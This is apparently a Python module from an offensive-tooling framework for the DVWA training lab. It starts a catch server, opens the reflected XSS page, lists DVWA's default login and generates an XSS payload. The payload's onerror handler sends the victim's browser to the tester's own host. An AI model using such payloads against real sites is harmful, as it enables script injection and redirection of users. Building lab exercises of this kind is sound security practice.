"""
modules/xss/xss.py
DVWA Reflected XSS — payload generation + HTTP catch server
"""

import socket
import subprocess
import webbrowser
from base_module import BaseModule
from utils import colored


class DVWAXSS(BaseModule):
    def __init__(self):
        super().__init__()
        self.name        = "dvwa_xss_reflected"
        self.description = "DVWA Reflected XSS — generate payload + catch redirect via HTTP server"

        self.options = {
            "RHOST": {"value": "",                    "required": True,  "description": "Target DVWA IP or hostname"},
            "LHOST": {"value": self._get_local_ip(),  "required": True,  "description": "Your IP for the catch server"},
            "LPORT": {"value": "8080",                "required": True,  "description": "HTTP server listen port"},
        }

        self._server_proc = None

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------
    @staticmethod
    def _get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    # ------------------------------------------------------------------
    # Help
    # ------------------------------------------------------------------
    def show_help(self):
        print(colored("\n=== DVWA Reflected XSS Module ===", "orange"))
        print(self.description)
        print("\nWorkflow:")
        print("  1. set RHOST / LHOST / LPORT")
        print("  2. setup             → start HTTP catch server + open DVWA page")
        print("  3. generate          → print payload to paste into the XSS form")
        print("\nCommands:")
        print("  setup                - Start HTTP server and open DVWA reflected XSS page")
        print("  generate             - Generate the reflected XSS payload")
        print("  set <option> <value> - Set an option")
        print("  show options         - Show current settings")
        print("  back / exit          - Return to framework (stops HTTP server)\n")

    # ------------------------------------------------------------------
    # Command dispatcher
    # ------------------------------------------------------------------
    def handle_command(self, cmd_input: str):
        cmd = cmd_input.strip()
        low = cmd.lower()

        if low in ["help", "show options"]:
            self.show_options()
            self.show_help()
            return

        if low.startswith("set "):
            parts = cmd.split(maxsplit=2)
            if len(parts) == 3:
                self.set_option(parts[1], parts[2])
            else:
                print("Usage: set <option> <value>")
            return

        if low == "setup":
            self._start_server()
            self._open_dvwa_page()
            return

        if low == "generate":
            self._generate_payload()
            return

        if low in ["back", "exit", "quit"]:
            self._stop_server()
            print(colored("[*] Returning to Bandito framework...", "yellow"))
            return

        print(colored(f"[-] Unknown command: {cmd}", "red"))
        print("Type 'help' for available commands.")

    def run(self):
        self._start_server()
        self._open_dvwa_page()

    # ------------------------------------------------------------------
    # Internals
    # ------------------------------------------------------------------
    def _start_server(self):
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]
        cmd   = f"python3 -m http.server {lport}"
        print(colored(f"[*] Starting HTTP server on {lhost}:{lport} ...", "yellow"))

        for terminal in (
            ["gnome-terminal", "--", "bash", "-c", cmd + "; echo 'Press Enter to close...'; read"],
            ["xterm", "-e", cmd],
        ):
            try:
                self._server_proc = subprocess.Popen(terminal)
                print(colored("[+] HTTP server started.", "green"))
                return
            except FileNotFoundError:
                continue

        print(colored(f"[-] Could not open terminal. Run manually:\n    {cmd}", "red"))

    def _stop_server(self):
        if self._server_proc:
            self._server_proc.terminate()
            self._server_proc = None

    def _open_dvwa_page(self):
        rhost = self.options["RHOST"]["value"]
        url   = f"http://{rhost}/vulnerabilities/xss_r/"
        print(colored(f"[+] Opening {url}", "yellow"))
        webbrowser.open(url)
        print(colored("\nNote: if you see the login page, log in manually (admin / password)", "orange"))
        print("      then navigate to Vulnerabilities → Reflected XSS.\n")

    def _generate_payload(self):
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]
        payload = f'<img src=x onerror="window.location=\'http://{lhost}:{lport}/xss_test\'">'

        print(colored("\n=== Reflected XSS Payload ===", "orange"))
        print("Paste into the 'What's your name?' field and submit:")
        print(colored("=" * 80, "yellow"))
        print(payload)
        print(colored("=" * 80, "yellow"))
        print(colored("\nWatch the HTTP server terminal for an incoming GET /xss_test\n", "yellow"))

        self._copy_to_clipboard(payload)

    @staticmethod
    def _copy_to_clipboard(text: str):
        try:
            subprocess.run(["xclip", "-sel", "clip"], input=text.encode(), check=True)
            print(colored("[+] Payload copied to clipboard.", "green"))
        except Exception:
            print(colored("[*] Copy the payload above manually.", "yellow"))
